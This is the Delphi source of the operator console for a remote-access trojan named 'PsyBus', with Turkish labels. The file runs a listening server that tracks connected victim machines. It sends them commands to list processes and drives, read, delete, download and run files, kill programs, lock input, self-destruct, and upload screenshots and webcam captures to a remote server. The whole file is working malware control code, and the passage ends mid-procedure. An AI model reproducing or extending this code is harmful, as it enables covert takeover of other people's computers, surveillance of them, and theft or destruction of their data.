unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls, TFlatButtonUnit,
  TFlatSpeedButtonUnit, Buttons, TFlatMemoUnit, TFlatEditUnit, ScktComp,
  TFlatListBoxUnit, TFlatCheckBoxUnit, Gauges, mmsystem, zlibex, ShellApi, MSNPopUp;

  const
  WM_NOTIFYICON  = WM_USER+333;

type
  TForm1 = class(TForm)
    ServerSocket1: TServerSocket;
    Memo1: TMemo;
    Label1: TLabel;
    FlatButton2: TFlatButton;
    FlatEdit1: TFlatEdit;
    FlatButton1: TFlatButton;
    FlatEdit2: TFlatEdit;
    Label4: TLabel;
    FlatButton3: TFlatButton;
    FlatButton4: TFlatButton;
    FlatButton5: TFlatButton;
    FlatButton6: TFlatButton;
    FlatButton7: TFlatButton;
    FlatButton8: TFlatButton;
    FlatButton9: TFlatButton;
    FlatButton10: TFlatButton;
    FlatButton11: TFlatButton;
    FlatButton12: TFlatButton;
    FlatButton13: TFlatButton;
    FlatButton14: TFlatButton;
    FlatButton15: TFlatButton;
    FlatButton16: TFlatButton;
    FlatButton17: TFlatButton;
    FlatButton18: TFlatButton;
    FlatButton19: TFlatButton;
    FlatEdit3: TFlatEdit;
    FlatEdit4: TFlatEdit;
    FlatEdit5: TFlatEdit;
    FlatEdit6: TFlatEdit;
    FlatEdit7: TFlatEdit;
    FlatEdit8: TFlatEdit;
    TrackBar1: TTrackBar;
    FlatButton20: TFlatButton;
    FlatButton21: TFlatButton;
    FlatButton22: TFlatButton;
    FlatButton23: TFlatButton;
    FlatButton24: TFlatButton;
    FlatButton25: TFlatButton;
    FlatButton26: TFlatButton;
    FlatButton27: TFlatButton;
    FlatButton28: TFlatButton;
    FlatButton29: TFlatButton;
    FlatEdit9: TFlatEdit;
    FlatButton32: TFlatButton;
    FlatButton33: TFlatButton;
    ListBox1: TListBox;
    CheckBox1: TCheckBox;
    FlatEdit10: TFlatEdit;
    FlatButton34: TFlatButton;
    zattiri: TButton;
    FlatButton35: TFlatButton;
    FlatButton36: TFlatButton;
    FlatButton30: TFlatButton;
    FlatButton31: TFlatButton;
    FlatButton37: TFlatButton;
    FlatButton38: TFlatButton;
    Gauge1: TGauge;
    FlatButton39: TFlatButton;
    FlatButton40: TFlatButton;
    FlatButton41: TFlatButton;
    FlatButton42: TFlatButton;
    FlatButton43: TFlatButton;
    kapaa: TButton;
    teneme: TButton;
    MSNPopUp1: TMSNPopUp;
    hesaplaa: TButton;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    FlatButton44: TFlatButton;
    FlatButton45: TFlatButton;
    FlatButton46: TFlatButton;
    FlatButton47: TFlatButton;
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
     procedure ServerSocket1Accept(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
  procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure ServerSocket1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure Edit2KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FlatButton14Click(Sender: TObject);
    procedure FlatButton3Click(Sender: TObject);
    procedure FlatButton4Click(Sender: TObject);
    procedure FlatButton5Click(Sender: TObject);
    procedure FlatButton6Click(Sender: TObject);
    procedure FlatButton7Click(Sender: TObject);
    procedure FlatButton8Click(Sender: TObject);
    procedure FlatButton9Click(Sender: TObject);
    procedure FlatButton10Click(Sender: TObject);
    procedure FlatButton11Click(Sender: TObject);
    procedure FlatButton12Click(Sender: TObject);
    procedure FlatButton13Click(Sender: TObject);
    procedure FlatButton15Click(Sender: TObject);
    procedure FlatButton16Click(Sender: TObject);
    procedure FlatButton19Click(Sender: TObject);
    procedure FlatButton17Click(Sender: TObject);
    procedure FlatButton18Click(Sender: TObject);
    procedure FlatButton20Click(Sender: TObject);
    procedure FlatButton21Click(Sender: TObject);
    procedure FlatButton22Click(Sender: TObject);
    procedure FlatButton23Click(Sender: TObject);
    procedure FlatButton25Click(Sender: TObject);
    procedure FlatButton26Click(Sender: TObject);
    procedure FlatButton27Click(Sender: TObject);
    procedure FlatButton28Click(Sender: TObject);
    procedure FlatButton29Click(Sender: TObject);
    procedure FlatButton24Click(Sender: TObject);
    procedure FlatButton30Click(Sender: TObject);
    procedure FlatButton32Click(Sender: TObject);
    procedure FlatButton33Click(Sender: TObject);
    procedure yenile;
    procedure Timer1Timer(Sender: TObject);
    procedure ListBox1DblClick(Sender: TObject);
    procedure FlatButton34Click(Sender: TObject);
    procedure zattiriClick(Sender: TObject);
    procedure FlatButton35Click(Sender: TObject);
    procedure FlatButton36Click(Sender: TObject);
    procedure FlatButton31Click(Sender: TObject);
    procedure FlatButton37Click(Sender: TObject);
    procedure FlatButton40Click(Sender: TObject);
    procedure FlatButton41Click(Sender: TObject);
    procedure FlatButton42Click(Sender: TObject);
    procedure FlatButton43Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure kapaaClick(Sender: TObject);
    procedure uyariClick(Sender: TObject);
    procedure tenemeClick(Sender: TObject);
    procedure hesaplaaClick(Sender: TObject);
    procedure ServerSocket1ClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure FlatButton44Click(Sender: TObject);
    procedure FlatButton45Click(Sender: TObject);
    procedure FlatButton46Click(Sender: TObject);
    procedure FlatButton47Click(Sender: TObject);
    procedure MSNPopUp1URLClick(Sender: TObject; URL: String);
  private
   tnid: TNotifyIconData;
    HMainIcon: HICON;
    procedure CMClickIcon(var msg: TMessage); message WM_NOTIFYICON;
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  DateTime : TDateTime;
  saat : string;
  Buf : string;
  MsgLen,LenReceive : Integer;
  bagliolan: integer;
implementation

{$R *.dfm}

function PlayWavFile(const FileName: string): Boolean;
begin
Result := PlaySound(PChar(FileName), 0, SND_ASYNC);
end;

procedure TForm1.CMClickIcon(var msg: TMessage);
begin
  case msg.lparam of
    WM_LBUTTONDBLCLK : Show;
  end;
end;

procedure butonkapa;
begin
form1.flatbutton3.enabled:=false;
form1.flatbutton4.enabled:=false;
form1.flatbutton5.enabled:=false;
form1.flatbutton6.enabled:=false;
form1.flatbutton7.enabled:=false;
form1.flatbutton8.enabled:=false;
form1.flatbutton9.enabled:=false;
form1.flatbutton10.enabled:=false;
form1.flatbutton11.enabled:=false;
form1.flatbutton12.enabled:=false;
form1.flatbutton13.enabled:=false;
form1.flatbutton15.enabled:=false;
form1.flatbutton16.enabled:=false;
form1.flatbutton19.enabled:=false;
form1.flatbutton17.enabled:=false;
form1.flatbutton18.enabled:=false;
form1.TrackBar1.Enabled:=false;
form1.FlatEdit3.Enabled:=False;
form1.FlatEdit8.Enabled:=False;
form1.FlatEdit4.Enabled:=False;
form1.FlatEdit5.Enabled:=False;
form1.FlatEdit6.Enabled:=False;
form1.FlatEdit7.Enabled:=False;
form1.FlatButton20.Enabled:=false;
form1.FlatButton21.Enabled:=false;
form1.FlatButton22.Enabled:=false;
form1.FlatButton23.Enabled:=false;
form1.FlatButton24.Enabled:=false;
form1.FlatButton26.Enabled:=false;
form1.FlatButton27.Enabled:=false;
form1.FlatButton28.Enabled:=false;
form1.FlatButton29.Enabled:=false;
form1.FlatButton30.Enabled:=false;
form1.FlatButton32.Enabled:=false;
form1.FlatButton33.Enabled:=false;
form1.FlatButton34.Enabled:=false;
form1.FlatButton35.Enabled:=false;
form1.FlatButton36.Enabled:=false;
form1.FlatButton31.Enabled:=false;
form1.FlatButton37.Enabled:=false;
form1.FlatButton38.Enabled:=false;
form1.FlatButton39.Enabled:=false;
form1.FlatButton40.Enabled:=false;
form1.FlatButton41.Enabled:=false;
form1.FlatButton42.Enabled:=false;
form1.FlatButton43.Enabled:=false;
form1.FlatButton44.Enabled:=false;
form1.FlatButton45.Enabled:=false;
form1.FlatButton46.Enabled:=false;
form1.FlatButton47.Enabled:=false;
end;

procedure butonac;
begin
form1.flatbutton3.enabled:=true;
form1.flatbutton4.enabled:=true;
form1.flatbutton5.enabled:=true;
form1.flatbutton6.enabled:=true;
form1.flatbutton7.enabled:=true;
form1.flatbutton8.enabled:=true;
form1.flatbutton9.enabled:=true;
form1.flatbutton10.enabled:=true;
form1.flatbutton11.enabled:=true;
form1.flatbutton12.enabled:=true;
form1.flatbutton13.enabled:=true;
form1.flatbutton15.enabled:=true;
form1.flatbutton16.enabled:=true;
form1.flatbutton19.enabled:=true;
form1.flatbutton17.enabled:=true;
form1.flatbutton18.enabled:=true;
form1.TrackBar1.Enabled:=True;
form1.FlatEdit3.Enabled:=True;
form1.FlatEdit8.Enabled:=True;
form1.FlatEdit4.Enabled:=True;
form1.FlatEdit5.Enabled:=True;
form1.FlatEdit6.Enabled:=True;
form1.FlatEdit7.Enabled:=True;
form1.FlatButton20.Enabled:=True;
form1.FlatButton21.Enabled:=True;
form1.FlatButton22.Enabled:=True;
form1.FlatButton23.Enabled:=True;
form1.FlatButton24.Enabled:=True;
form1.FlatButton26.Enabled:=true;
form1.FlatButton27.Enabled:=true;
form1.FlatButton28.Enabled:=true;
form1.FlatButton29.Enabled:=true;
form1.FlatButton30.Enabled:=true;
form1.FlatButton32.Enabled:=true;
form1.FlatButton33.Enabled:=true;
form1.FlatButton34.Enabled:=true;
form1.FlatButton35.Enabled:=true;
form1.FlatButton36.Enabled:=true;
form1.FlatButton31.Enabled:=true;
form1.FlatButton37.Enabled:=true;
form1.FlatButton38.Enabled:=true;
form1.FlatButton39.Enabled:=true;
form1.FlatButton40.Enabled:=true;
form1.FlatButton41.Enabled:=true;
form1.FlatButton42.Enabled:=true;
form1.FlatButton43.Enabled:=true;
form1.FlatButton44.Enabled:=true;
form1.FlatButton45.Enabled:=true;
form1.FlatButton46.Enabled:=true;
form1.FlatButton47.Enabled:=true;
end;

Procedure TForm1.yenile;
var
i,tekrarsec : integer;
begin
tekrarsec:=listbox1.ItemIndex;
ListBox1.Clear;
for i := 0 To ServerSocket1.Socket.ActiveConnections -1 do
begin
listbox1.Items.Add(inttostr(i)+' = '+ServerSocket1.Socket.Connections[i].RemoteAddress+' / '+saat)
end;
listbox1.ItemIndex:=tekrarsec;
end;

procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
DateTime := Time;
saat := TimeToStr(dateTime);
label1.Font.Color:=clyellow;
Memo1.Lines.Add('********* Yanniz degiliz : '+Socket.RemoteAddress);
PlayWavFile('pda.wav');
msnpopup1.Text:=Socket.RemoteAddress;
msnpopup1.ShowPopUp;
label1.caption:='Baglandi: ' +Socket.RemoteAddress;
bagliolan:=bagliolan + 1;
flatedit10.text:=inttostr(bagliolan);
listbox1.Items.Add(inttostr(bagliolan-1)+' = '+ServerSocket1.Socket.Connections[bagliolan-1].RemoteAddress+' / '+saat)
end;

procedure TForm1.ServerSocket1Accept(Sender: TObject;
  Socket: TCustomWinSocket);
begin
if checkbox1.checked=true then begin
if socket.Connected = true then socket.Disconnect(1);
end;
DateTime := Time;
saat := TimeToStr(dateTime);
label1.Font.Color:=cllime;
label1.caption:='Baglant� Ba$ar�l� : '+Socket.RemoteAddress;
flatedit2.Enabled:=true;
flatbutton2.Enabled:=true;
Memo1.Lines.Add('********* Ho$geldi sefalar getirdi : '+Socket.RemoteAddress);
socket.SendText('-giris');
butonac
end;

function parcala(const s: string; wordIndex: integer): string;
var
  index, counter: integer;
begin
  result:= trim(s); //result equals the string you entered
  counter := 0; //counter starts at 0
  index := Pos('||', result); //if there are 2 spaces by each other
   while index > 0 do //while its true theres more then 1 space by each other
  begin
   Delete(result, index, 1); //delete one of the spaces
   index := Pos('||', result); //check the string again for double spaces
  end;
  //Now there are no spaces next to each other we can continue ;)
  index := Pos('|', result); //get the position of the first word
    while ((counter < wordIndex) and (index > 0)) do //while counter is less then wordindex and there are more words countinue
  begin
    Delete(result, 1, index); //delete all characters from the beginning index to the space to the next word
    index := Pos('|', result); //check if there any more words in the string by looking for spaces

    counter := counter + 1; //increment the counter by one
  end;

  if (counter < wordIndex) then //if were not enough words in your search return a blank string
    result:= '';

  index := Pos('|', result); //check if there are more words after your word
  if index > 0 then  //if there are more words
    Delete(result, index, maxInt);// start at the space then delete all the words after the space maxInt is the largest number a integer will go by
end;

function hesapla(sure:integer): string;
const
  ticksperday: Integer    = 1000 * 60 * 60 * 24;
  ticksperhour: Integer   = 1000 * 60 * 60;
  ticksperminute: Integer = 1000 * 60;
  tickspersecond: Integer = 1000;
var
  t:Longword;
  d, h, m, s: Integer;
begin
  t := sure;
  d := t div ticksperday;
  Dec(t, d * ticksperday);
  h := t div ticksperhour;
  Dec(t, h * ticksperhour);
  m := t div ticksperminute;
  Dec(t, m * ticksperminute);
  s := t div tickspersecond;
  Result := IntToStr(d) + ' G�n ' + IntToStr(h) + ' Saat ' + IntToStr(m) +' Dakika ' + IntToStr(s) + ' Saniye';
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
  var
  cevap: string;
  islemsayisi: integer;
  ii,hh,zz,kk,tt,xx,yy: integer;
  ksayisi,dsayisi,hdd,pnc: integer;
  label SON;

begin
DateTime := Time;
saat := TimeToStr(dateTime);
cevap:= socket.receivetext;
//s�k�st�r�lm�s komutlar� acmak icin
if copy (cevap, 1, 4)='+psy' then begin
delete(cevap, 1, 4);
try
cevap:=ZDecompressStr(cevap);
except
on Exception DO Memo1.Lines.Add('��zme hatas�!');
end;
end;
// burdan yukar� komut yazma ! ! !

if checkbox3.Checked then begin
if copy (cevap, 1, 4)='+al=' then begin
delete(cevap, 1, 4);
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DYUKLE '+cevap+'|'+'ekran000'+inttostr(random(995929))+'.jpg'+'|'+flatedit3.Text+'|'+flatedit8.Text+'|'+flatedit4.Text+'|'+flatedit5.text);
end;
end;

if copy (cevap, 1, 4)='-cvp' then begin
delete(cevap, 1, 4);
Memo1.Lines.Add('****** Lag : '+inttostr(gettickcount - strtoint(cevap))+' ms');
GOTO SON
end;

if copy (cevap, 1, 6)='-bilgi' then begin
Memo1.Lines.Add('*********************************************');
for xx:=1 to 10 do begin
if xx=1 then Memo1.Lines.Add('Bilgisayar : '+parcala(cevap,xx));
if xx=2 then Memo1.Lines.Add('Kullan�c� : '+parcala(cevap,xx));
if xx=3 then Memo1.Lines.Add('Windows S�r�m� : '+parcala(cevap,xx));
if xx=4 then Memo1.Lines.Add('Dil : '+parcala(cevap,xx));
if xx=5 then Memo1.Lines.Add('��z�n�rl�k : '+parcala(cevap,xx));
if xx=6 then Memo1.Lines.Add('Orjinal ismi : '+parcala(cevap,xx));
if xx=7 then Memo1.Lines.Add('Kay�tl� Kullan�c� : '+parcala(cevap,xx));
if xx=8 then Memo1.Lines.Add('Kayitli firma : '+parcala(cevap,xx));
if xx=9 then Memo1.Lines.Add('Calisma S�resi : '+hesapla(strtoint(parcala(cevap,xx))));
if xx=10 then Memo1.Lines.Add('Bo$ta Kalan s�re(idle) : '+hesapla(strtoint(parcala(cevap,xx))));
end;
Memo1.Lines.Add('*********************************************');
GOTO SON
end;

if copy (cevap, 1, 6)='-tanim' then begin
Memo1.Lines.Add('****************************************');
for yy:=1 to 6 do begin
if yy=1 then Memo1.Lines.Add('Program : '+parcala(cevap,yy));
if yy=2 then Memo1.Lines.Add('Kurulum ad� : '+parcala(cevap,yy));
if yy=3 then Memo1.Lines.Add('Anahtar Kaydi : '+parcala(cevap,yy));
if yy=4 then Memo1.Lines.Add('Baglanti : '+parcala(cevap,yy));
if yy=5 then Memo1.Lines.Add('Mutex : '+parcala(cevap,yy));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;

if copy (cevap, 1, 9)='-islemler' then begin
Memo1.Lines.Add('****************************************');
islemsayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add('islem sayisi:'+inttostr(islemsayisi));
for kk:=1 to islemsayisi do begin
Memo1.Lines.Add(parcala(cevap,kk));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;

if copy (cevap, 1, 7)='-klasor' then begin
Memo1.Lines.Add('****************************************');
ksayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add('Klas�r:'+inttostr(ksayisi));
for hh:=1 to ksayisi do begin
Memo1.Lines.Add(parcala(cevap,hh));
end;
delete(cevap, 1, pos('-dosya', cevap)-1);
//Memo1.Lines.Add(cevap);
Memo1.Lines.Add('---------------');
if copy (cevap, 1, 6)='-dosya' then begin
dsayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add('Dosya:'+inttostr(dsayisi));
for zz:=1 to dsayisi do begin
Memo1.Lines.Add(parcala(cevap,zz));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;
end;

if copy (cevap, 1, 7)='-srcler' then begin
Memo1.Lines.Add('****************************************');
hdd:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add('S�r�c�ler:'+inttostr(hdd));
for ii:=1 to hdd do begin
Memo1.Lines.Add(parcala(cevap,ii));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;

if copy (cevap, 1, 8)='-pencere' then begin
Memo1.Lines.Add('****************************************');
pnc:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add('Aktif Pencereler:'+inttostr(pnc));
for tt:=1 to pnc do begin
Memo1.Lines.Add(parcala(cevap,tt));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;

Memo1.Lines.Add('['+saat+']: '+cevap);
SON:
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
serversocket1.Active := false;
Serversocket1.Port := strtoint(flatedit1.Text);
serversocket1.Active := true;
label1.Font.Color:=clyellow;
flatbutton1.enabled:=false;
flatedit1.enabled:=false;
flatbutton14.enabled:=true;
label1.caption:='Ba�lant� Bekleniyor..';
tnid.szTip:= 'PsyBus : Dinlemede';
butonkapa;
memo1.Clear;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText(flatedit2.text);
Form1.flatEdit2.Clear;
end;

procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
label katliamkontrol;
begin
label1.Font.Color:=clred;
label1.caption:='Cikis : '+Socket.Remoteaddress;
bagliolan:=bagliolan - 1;
flatedit10.text:=inttostr(bagliolan);
if bagliolan = 0 then butonkapa
else butonac;

katliamkontrol:
if strtoint(flatedit10.Text) <> 0 then begin
if strtoint(flatedit9.Text) > strtoint(flatedit10.Text) then begin
flatedit9.Text:=inttostr(strtoint(flatedit9.Text)-1);
Memo1.Lines.Add('********* Zorunlu Baglanti degi$imi : '+flatedit9.Text);
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('-kdegisti');
goto katliamkontrol;
end;
end;

if strtoint(flatedit10.Text) <> 0 then begin
if strtoint(flatedit9.Text) = strtoint(flatedit10.Text) then begin
flatedit9.Text:=inttostr(strtoint(flatedit9.Text)-1);
Memo1.Lines.Add('********* Zorunlu Baglanti degi$imi : '+flatedit9.Text);
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('-kdegisti');
end;
end;

if serversocket1.Socket.Connected=false then butonkapa;
end;

procedure TForm1.Edit2KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
if key = VK_RETURN then begin
if checkbox2.Checked then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/'+flatedit2.text);
if not checkbox2.Checked then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText(flatedit2.text);
flatedit2.Clear;
end;
end;

procedure TForm1.FlatButton14Click(Sender: TObject);
begin
if serversocket1.Socket.Connected = true then begin
serversocket1.Socket.Disconnect(0);
end;
serversocket1.Active := false;
flatbutton1.enabled:=true;
flatedit1.enabled:=true;
flatbutton14.enabled:=false;
label1.caption:='Haz�r..';
flatbutton2.enabled:=false;
flatedit2.enabled:=false;
bagliolan:=0;
flatedit10.Text:=inttostr(bagliolan);
butonkapa
end;

procedure TForm1.FlatButton3Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/TL');
end;

procedure TForm1.FlatButton4Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PRG');
end;

procedure TForm1.FlatButton5Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DRV');
end;

procedure TForm1.FlatButton6Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/APENC');
end;

procedure TForm1.FlatButton7Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DR');
end;

procedure TForm1.FlatButton8Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('-ping'+Inttostr(gettickcount));
end;

procedure TForm1.FlatButton9Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Parametre(leri) girin','');
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/LS '+bilgi);
end;

procedure TForm1.FlatButton10Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Parametre(leri) girin','');
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/CD '+bilgi);
end;

procedure TForm1.FlatButton11Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Parametre(leri) girin','');
if bilgi='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DB '+bilgi);
end;

procedure TForm1.FlatButton12Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Parametre(leri) girin','program.exe');
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PGEBERT '+bilgi);
end;

procedure TForm1.FlatButton13Click(Sender: TObject);
var
bilgi,b2 : string;
begin
bilgi := inputbox('Dosya indir','Kaynak?','');
if bilgi='' then exit;
b2 := inputbox('Dosya indir','Hedef?','');
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/INDIR '+bilgi+'|'+b2);
end;

procedure TForm1.FlatButton15Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/CROM|AC');
end;

procedure TForm1.FlatButton16Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/CROM|KAPA');
end;

procedure TForm1.FlatButton19Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DYUKLE '+flatedit6.Text+'|'+flatedit7.Text+'|'+flatedit3.Text+'|'+flatedit8.Text+'|'+flatedit4.Text+'|'+flatedit5.text);
end;

procedure TForm1.FlatButton17Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/SC '+inttostr(trackbar1.Position));
end;

procedure TForm1.FlatButton18Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/CC '+inttostr(trackbar1.Position));
end;

procedure TForm1.FlatButton20Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/WDIZINI');
end;

procedure TForm1.FlatButton21Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/SYSDIZINI');
end;

procedure TForm1.FlatButton22Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/TEMP');
end;

procedure TForm1.FlatButton23Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/BILGI');
end;

procedure TForm1.FlatButton25Click(Sender: TObject);
var
dosya:string;
var  F:Textfile;
begin
dosya:='gunluk'+inttostr(random(999995000))+'.txt';
Assignfile(F,dosya);
if not FileExists(dosya) Then begin
Rewrite(F);
Closefile(F);
End
Else
Assignfile(F,dosya);
{$I-}
Append(F);
{$I+}
If IOResult<> 0 Then
Begin
ShowMessage('Dosya acilamadi');
End;
Write(F,Memo1.Text);
Memo1.Clear;
Closefile(F);
end;

procedure TForm1.FlatButton26Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/BKES');
end;

procedure TForm1.FlatButton27Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/TEMIZLIK');
end;

procedure TForm1.FlatButton28Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Silinecek Dosya?','');
if bilgi='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/SIL '+bilgi);
end;

procedure TForm1.FlatButton29Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Okunacak dosya?','.txt');
if bilgi='.txt' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/OKU '+bilgi);
end;

procedure TForm1.FlatButton24Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Calistiricak dosya?','.exe');
if bilgi='.exe' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/HADEE '+bilgi);
end;

procedure TForm1.FlatButton30Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Kapatilacak Ba$lik?','');
if bilgi='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PKAPAT '+bilgi);
end;

procedure TForm1.FlatButton32Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Calistiricak dosya?','.exe');
if bilgi='.exe' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/GC '+bilgi);
end;

procedure TForm1.FlatButton33Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Calistiricak dosya?','.exe');
if bilgi='.exe' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DOS '+bilgi);
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
yenile;
end;

procedure TForm1.ListBox1DblClick(Sender: TObject);
begin
flatedit9.Text:=inttostr(listbox1.itemindex);
Memo1.Lines.Add('****************************************');
Memo1.Lines.Add('********* Baglanti degi$tirildi : '+inttostr(listbox1.itemindex));
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('-kdegisti');
end;

procedure TForm1.FlatButton34Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/TANIMLA');
end;

procedure TForm1.zattiriClick(Sender: TObject);
begin
yenile;
end;

procedure TForm1.FlatButton35Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/INTIHAR');
end;

procedure TForm1.FlatButton36Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/MC '+inttostr(trackbar1.Position));
end;

procedure TForm1.FlatButton31Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/KILITLE');
end;

procedure TForm1.FlatButton37Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/KILITAC');
end;

procedure TForm1.FlatButton40Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Pencere ba$l���?','');
if bilgi='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PFLASH '+bilgi);
end;

procedure TForm1.FlatButton41Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','A.edilecek Pencere basligi?','');
if bilgi='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PGETIR '+bilgi);
end;

procedure TForm1.FlatButton42Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DYUKLE '+'C:\WINDOWS\system32\sysrss32.sys'+'|'+'ekran000'+inttostr(random(995929))+'.jpg'+'|'+flatedit3.Text+'|'+flatedit8.Text+'|'+flatedit4.Text+'|'+flatedit5.text);
end;

procedure TForm1.FlatButton43Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DYUKLE '+'C:\WINDOWS\system32\sysrss16.sys'+'|'+'cam000'+inttostr(random(995929))+'.jpg'+'|'+flatedit3.Text+'|'+flatedit8.Text+'|'+flatedit4.Text+'|'+flatedit5.text);
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  HMainIcon                := LoadIcon(MainInstance, 'MAINICON');

  Shell_NotifyIcon(NIM_DELETE, @tnid);

  tnid.cbSize              := sizeof(TNotifyIconData);
  tnid.Wnd                 := handle;
  tnid.uID                 := 123;
  tnid.uFlags              := NIF_MESSAGE or NIF_ICON or NIF_TIP;
  tnid.uCallbackMessage    := WM_NOTIFYICON;
  tnid.hIcon               := HMainIcon;
  tnid.szTip               := 'PsyBus: Dinlemede';

  Shell_NotifyIcon(NIM_ADD, @tnid);
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Action := caNone;
  Hide;
